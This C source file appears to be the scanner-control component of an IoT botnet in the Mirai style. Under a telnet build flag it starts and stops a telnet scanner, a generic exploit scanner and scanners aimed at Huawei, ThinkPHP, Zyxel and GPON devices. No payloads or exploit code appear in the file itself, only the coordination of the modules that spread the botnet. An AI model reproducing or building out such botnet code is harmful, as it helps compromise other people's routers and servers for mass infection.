#define _GNU_SOURCE
#ifdef NP_TELNET

#include "scanner_control.h"
#include "scanner.h"
#include "exploit_scanner.h"
#include "huawei.h"
#include "thinkphp.h"
#include "zyxel_scanner.h"
#include "gpon80_scanner.h"
#include "gpon8080_scanner.h"

void scanner_start_all(void)
{
	scanner_init();
	exploit_scanner_init();
	huawei_init();
	thinkphp_init();
	zyxel_scanner_init();
	gpon80_scanner_init();
	gpon8080_scanner_init();
}

void scanner_stop_all(void)
{
	scanner_kill();
	exploit_scanner_kill();
	huawei_kill();
	thinkphp_kill();
	zyxel_scanner_kill();
	gpon80_scanner_kill();
	gpon8080_scanner_kill();
}

#else

#include "scanner_control.h"

void scanner_start_all(void) { (void)0; }
void scanner_stop_all(void) { (void)0; }

#endif
